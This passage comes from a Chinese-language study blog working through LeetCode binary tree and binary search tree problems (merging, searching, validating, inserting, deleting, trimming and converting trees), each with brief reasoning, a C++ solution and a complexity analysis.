<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">NULL</span>) <span class="keyword">return</span> root2;</span><br><span class="line">        <span class="keyword">if</span> (root2 == <span class="literal">NULL</span>) <span class="keyword">return</span> root1;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//中 修改root1</span></span><br><span class="line">        root1-&gt;val += root2-&gt;val;</span><br><span class="line">        <span class="comment">//左</span></span><br><span class="line">        root1-&gt;left = <span class="built_in">mergeTrees</span>(root1-&gt;left, root2-&gt;left);</span><br><span class="line">        <span class="comment">//右</span></span><br><span class="line">        root1-&gt;right = <span class="built_in">mergeTrees</span>(root1-&gt;right, root2-&gt;right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(min(n, m)) 两个二叉树都不为空才进行操作 索引被访问到节点数不会大于较小的二叉树</li>
<li>空间复杂度：O(min(n, m))</li>
</ul>
<h1 id="16-leetcode-700-二叉搜索树中的搜索-E"><a href="#16-leetcode-700-二叉搜索树中的搜索-E" class="headerlink" title="16.leetcode-700-二叉搜索树中的搜索-E"></a>16.leetcode-700-二叉搜索树中的搜索-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/search-in-a-binary-search-tree/">700. 二叉搜索树中的搜索 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>二叉搜索树：有数值，根节点左边的子树均小于根节点，根节点右边的子树均大于根节点</li>
<li>前序遍历<ul>
<li>终止条件：root&#x3D;&#x3D;null  || root-&gt;val &#x3D;&#x3D; val   return root 指针</li>
<li>搜索根据二叉搜索树的有序性</li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">searchBST</span><span class="params">(TreeNode* root, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span> || root-&gt;val == val) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//搜索</span></span><br><span class="line">        TreeNode* res = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; val) res = <span class="built_in">searchBST</span>(root-&gt;left, val);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; val) res = <span class="built_in">searchBST</span>(root-&gt;right, val);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 最坏情况全部需要遍历一次</li>
<li>空间复杂度：O(n)</li>
</ul>
<h1 id="17-leetcode-98-验证二叉搜索树-M"><a href="#17-leetcode-98-验证二叉搜索树-M" class="headerlink" title="17.leetcode-98-验证二叉搜索树-M"></a>17.leetcode-98-验证二叉搜索树-M</h1><p><strong>题目：<a href="https://leetcode.cn/problems/validate-binary-search-tree/">98. 验证二叉搜索树 - 力扣（LeetCode）</a></strong></p>
<p><strong>思路：</strong></p>
<ul>
<li>验证一个棵树是否是二叉搜索树，根据性质来</li>
<li>方法一：中序遍历（左中右）可以得到递增的数组   —判断数组是否有序</li>
<li>方法二：中序遍历，但是不用数组去判断，直接用单个数值来判断<ul>
<li>long long maxVal（有int 最小值 所以要用LONG_MIN）记录了当前节点前一个节点的数值</li>
</ul>
</li>
<li>方法三：中序遍历，前一个节点和后一个节点直接进行比较 pre记录root 的前一个节点</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lass Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//中序遍历 左中右</span></span><br><span class="line">        <span class="type">bool</span> left = <span class="built_in">isValidBST</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; pre-&gt;val &gt;= root-&gt;val) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//前一个节点大于当前节点的值</span></span><br><span class="line">        pre = root;<span class="comment">//记录前一个节点</span></span><br><span class="line">        <span class="type">bool</span> right = <span class="built_in">isValidBST</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> left &amp;&amp; right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n) 全部遍历</li>
<li>空间复杂度：O(n) 栈递归</li>
</ul>
<h1 id="18-leetcode-530-二叉搜索树的最小绝对差-E"><a href="#18-leetcode-530-二叉搜索树的最小绝对差-E" class="headerlink" title="18.leetcode-530-二叉搜索树的最小绝对差-E"></a>18.leetcode-530-二叉搜索树的最小绝对差-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/minimum-absolute-difference-in-bst/description/">530. 二叉搜索树的最小绝对差 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>中序遍历是一个有序的数组，求相邻两个元素的最小绝对差</li>
<li>在中序遍历的时候直接用两个指针进行操作<ul>
<li>返回值void</li>
<li>终止条件 cur &#x3D;&#x3D; null return</li>
<li>中序遍历（左中右）中计算差值</li>
</ul>
</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    TreeNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> res = INT_MAX;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span><span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//中序遍历</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (pre != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            res = <span class="built_in">min</span>(res, cur-&gt;val - pre-&gt;val);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = cur;</span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(N)</li>
<li>空间复杂度：O(N)</li>
</ul>
<h1 id="19-leetcode-501-二叉搜索树中的众数-E"><a href="#19-leetcode-501-二叉搜索树中的众数-E" class="headerlink" title="19.leetcode-501-二叉搜索树中的众数-E"></a>19.leetcode-501-二叉搜索树中的众数-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/find-mode-in-binary-search-tree/description/">501. 二叉搜索树中的众数 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>输出众数的集合，众数的个数不止一个</li>
<li>双指针<ul>
<li>返回值void</li>
<li>终止条件 cur &#x3D;&#x3D; null</li>
<li>中序遍历：左中右 维护 count 和result数组</li>
<li>更新maxcount </li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231102103940002.png" alt="image-20231102103940002"></li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lass Solution &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    TreeNode* pre = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxCount = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span><span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//左中右</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;left);</span><br><span class="line">        <span class="comment">//zhong</span></span><br><span class="line">        <span class="keyword">if</span> (pre == <span class="literal">nullptr</span>) count = <span class="number">1</span>;						<span class="comment">//叶子节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pre-&gt;val == cur-&gt;val) count++; </span><br><span class="line">        <span class="keyword">else</span> count = <span class="number">1</span>;										<span class="comment">//不相等的情况</span></span><br><span class="line">        pre = cur;</span><br><span class="line">        <span class="keyword">if</span> (count == maxCount) res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (count &gt; maxCount) &#123;</span><br><span class="line">            maxCount = count;								<span class="comment">//更新maxCount</span></span><br><span class="line">            res.<span class="built_in">clear</span>();									<span class="comment">//清空</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(cur-&gt;val);						<span class="comment">//重新放入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//right</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findMode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n) 每个元素遍历一次</li>
<li>空间复杂度：O(n) 栈递归</li>
</ul>
<h1 id="20-leetcode-236-二叉树的最近公共祖先-M"><a href="#20-leetcode-236-二叉树的最近公共祖先-M" class="headerlink" title="20.leetcode-236-二叉树的最近公共祖先-M"></a>20.leetcode-236-二叉树的最近公共祖先-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/description/">236. 二叉树的最近公共祖先 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>最<strong>近公共祖先可以是节点本身</strong></li>
<li>自低往上去遍历———-回溯—–<strong>一定要用后序遍历（左右中）</strong></li>
<li>递归：<ul>
<li>返回值返回节点 treenode *</li>
<li>终止条件： root &#x3D;&#x3D; null return root；<ul>
<li>如果遇到 q和p  向上返回 return root；</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231102112454954.png" alt="image-20231102112454954"></li>
</ul>
</li>
<li>后序遍历（左右中）：告诉有没有出现p或q 出现了范围值就不为空</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231102112900391.png" alt="image-20231102112900391"></li>
</ul>
</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (root == p || root == q) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="comment">//后序遍历 左右中</span></span><br><span class="line">        TreeNode* left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">        TreeNode* right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="comment">//中</span></span><br><span class="line">        <span class="keyword">if</span> (left != <span class="literal">NULL</span> &amp;&amp; right != <span class="literal">NULL</span>) <span class="keyword">return</span> root; 			<span class="comment">//说明找到了p或q</span></span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">NULL</span> &amp;&amp; right != <span class="literal">NULL</span>) <span class="keyword">return</span> right;			<span class="comment">//右边找到了</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (left != <span class="literal">NULL</span> &amp;&amp; right == <span class="literal">NULL</span>) <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//left == null &amp;&amp; right == null;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<p>同上</p>
<h1 id="21-leetcode-235-二叉搜索树的最近公共祖先-M"><a href="#21-leetcode-235-二叉搜索树的最近公共祖先-M" class="headerlink" title="21.leetcode-235-二叉搜索树的最近公共祖先-M"></a>21.leetcode-235-二叉搜索树的最近公共祖先-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/description/">235. 二叉搜索树的最近公共祖先 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>二叉搜索树特性</li>
<li>最近公共祖先—<strong>如果节点处于 p 和q 之间 那么一定是最近公共祖先</strong></li>
<li>递归：<ul>
<li>返回值 treenode </li>
<li>终止条件： cur &#x3D;&#x3D; null return null</li>
<li>单层递归逻辑：不需要对中节点处理，所以不涉及前中后序</li>
</ul>
</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231106103532085.png" alt="image-20231106103532085"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//left</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; p-&gt;val &amp;&amp; root-&gt;val &gt; q-&gt;val) &#123;</span><br><span class="line">            TreeNode* left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">            <span class="keyword">if</span> (left != <span class="literal">NULL</span>) <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//right</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; p-&gt;val &amp;&amp; root-&gt;val &lt; q-&gt;val) &#123;</span><br><span class="line">            TreeNode* right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">            <span class="keyword">if</span> (right != <span class="literal">NULL</span>) <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;<span class="comment">//其余情况，在中间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(N)</li>
<li>空间复杂度：O(N)</li>
</ul>
<h1 id="22-leetcode-701-二叉搜索树中的插入操作-M"><a href="#22-leetcode-701-二叉搜索树中的插入操作-M" class="headerlink" title="22.leetcode-701-二叉搜索树中的插入操作-M"></a>22.leetcode-701-二叉搜索树中的插入操作-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/insert-into-a-binary-search-tree/description/">701. 二叉搜索树中的插入操作 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>插入后仍然保持是二叉树</li>
<li><strong>不限制二叉树的结构，将数都插入到叶子节点即可</strong></li>
<li>递归：<ul>
<li>终止条件： root &#x3D;&#x3D; null —找到叶子节点，插入节点</li>
</ul>
</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231106110124080.png" alt="image-20231106110124080"></li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            TreeNode* node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;<span class="comment">//返回给上一个节点 root的左右子树，因为上一个指向的是root-&gt;left / right</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//left</span></span><br><span class="line">        <span class="keyword">if</span> (val &lt; root-&gt;val) &#123;</span><br><span class="line">            root-&gt;left = <span class="built_in">insertIntoBST</span>(root-&gt;left, val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//right </span></span><br><span class="line">        <span class="keyword">if</span> (val &gt; root-&gt;val) &#123;</span><br><span class="line">            root-&gt;right = <span class="built_in">insertIntoBST</span>(root-&gt;right, val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<p>同上</p>
<h1 id="23-leetcode-450-删除二叉搜索树中的节点-M"><a href="#23-leetcode-450-删除二叉搜索树中的节点-M" class="headerlink" title="23.leetcode-450-删除二叉搜索树中的节点-M"></a>23.leetcode-450-删除二叉搜索树中的节点-M</h1><p><strong>题目：<a href="https://leetcode.cn/problems/delete-node-in-a-bst/description/">450. 删除二叉搜索树中的节点 - 力扣（LeetCode）</a></strong></p>
<p><strong>思路：</strong></p>
<ul>
<li>删除节点需要改二叉搜索树的结构，比上一题要复杂很多</li>
<li>没找到： 直接返回原二叉树 root &#x3D;&#x3D; null return null</li>
<li>找到删除的点：<ul>
<li>叶子节点：左右都空直接删</li>
<li>左子节点不空，右为空</li>
<li>左空 右不空： 让其父节点直接指向</li>
<li>左右都不空： 最复杂—继位—–变动最大—画图理解</li>
</ul>
</li>
<li>递归：<ul>
<li>终止条件：找到删的</li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lass Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">deleteNode</span><span class="params">(TreeNode* root, <span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> root; <span class="comment">//没有找到节点的情况</span></span><br><span class="line">        <span class="comment">//找到节点的情况</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val == key) &#123;</span><br><span class="line">            <span class="comment">//叶子节点</span></span><br><span class="line">            <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">delete</span> root;<span class="comment">//内存释放</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//左孩子为空，右孩子不为空</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;left == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">auto</span> retNode = root-&gt;right;</span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> retNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">auto</span> retNode = root-&gt;left;</span><br><span class="line">                <span class="keyword">delete</span> root;</span><br><span class="line">                <span class="keyword">return</span> retNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                TreeNode* cur = root-&gt;right;</span><br><span class="line">                <span class="keyword">while</span> (cur-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    cur = cur-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">                cur-&gt;left = root-&gt;left;</span><br><span class="line">                TreeNode* tmp = root;</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">                <span class="keyword">delete</span> tmp;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; key) root-&gt;left = <span class="built_in">deleteNode</span>(root-&gt;left, key);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; key) root-&gt;right = <span class="built_in">deleteNode</span>(root-&gt;right, key);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<p>同上</p>
<h1 id="24-leetcode-669-修剪二叉搜索树-M"><a href="#24-leetcode-669-修剪二叉搜索树-M" class="headerlink" title="24.leetcode-669-修剪二叉搜索树-M"></a>24.leetcode-669-修剪二叉搜索树-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/trim-a-binary-search-tree/description/">669. 修剪二叉搜索树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>要删除的节点小于左边界，但其右子树可能符合区间，同理，节点大于右边界，其左子树可能符合区间。</li>
<li>小于左边界，继续向右遍历；大于右区间，继续向左去边界</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231107103033755.png" alt="image-20231107103033755"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(TreeNode* cur, <span class="type">int</span> low, <span class="type">int</span> high)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">nullptr</span>) <span class="keyword">return</span> cur;</span><br><span class="line">        <span class="keyword">if</span> (cur-&gt;val &lt; low) &#123;</span><br><span class="line">            <span class="comment">//继续向右遍历</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">traversal</span>(cur-&gt;right, low, high);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cur-&gt;val &gt; high) &#123;</span><br><span class="line">            <span class="comment">//继续向左遍历</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">traversal</span>(cur-&gt;left, low, high);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左右</span></span><br><span class="line">        cur-&gt;left = <span class="built_in">traversal</span>(cur-&gt;left, low, high);</span><br><span class="line">        cur-&gt;right = <span class="built_in">traversal</span>(cur-&gt;right, low, high);</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">trimBST</span><span class="params">(TreeNode* root, <span class="type">int</span> low, <span class="type">int</span> high)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(root, low, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<p>同上</p>
<h1 id="25-leetcode-108-将有序数组转换成二叉搜索树-E"><a href="#25-leetcode-108-将有序数组转换成二叉搜索树-E" class="headerlink" title="25.leetcode-108-将有序数组转换成二叉搜索树-E"></a>25.leetcode-108-将有序数组转换成二叉搜索树-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/description/">108. 将有序数组转换为二叉搜索树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>高度平衡二叉树</li>
<li>选中间节点然后分为左右区间，继续选择中间节点</li>
<li>确定区间的定义，左闭右开或者左闭右开。。。 因为要对区间进行分割</li>
<li>递归<ul>
<li>终止条件 left 》 right  return null</li>
<li>左闭右闭区间 mid - 1 ；左闭右开 mid</li>
</ul>
</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231107105703670.png" alt="image-20231107105703670"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left &gt; right) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="type">int</span> mid = (left + right) / <span class="number">2</span>;<span class="comment">//因为left 和right 是数组下标所以本题不会数据溢出</span></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[mid]);</span><br><span class="line">        <span class="comment">//left</span></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(nums, left, mid - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//right</span></span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(nums, mid + <span class="number">1</span>, right);</span><br><span class="line">        <span class="comment">//else</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedArrayToBST</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> numsSize = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(nums, <span class="number">0</span>, numsSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h1 id="26-leetcode-538-把二叉搜索树转换为累加树-M"><a href="#26-leetcode-538-把二叉搜索树转换为累加树-M" class="headerlink" title="26.leetcode-538-把二叉搜索树转换为累加树-M"></a>26.leetcode-538-把二叉搜索树转换为累加树-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/convert-bst-to-greater-tree/description/">538. 把二叉搜索树转换为累加树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>比该节点大的数值都做一个累加</li>
<li>中序—左中右   进行倒序—– 右中左</li>
<li>双指针</li>
<li>递归<ul>
<li>int pre &#x3D; 0，</li>
<li>返回值 void 在遍历时候更新节点数值</li>
<li>终止条件 cur &#x3D; null return；</li>
<li>右中左  中 cur + pre</li>
</ul>
</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231107111732754.png" alt="image-20231107111732754"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> pre = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span> <span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//right</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;right);</span><br><span class="line">        <span class="comment">//mid</span></span><br><span class="line">        cur-&gt;val += pre;</span><br><span class="line">        pre = cur-&gt;val;</span><br><span class="line">        <span class="comment">//left</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root);</span><br><span class="line">        <span 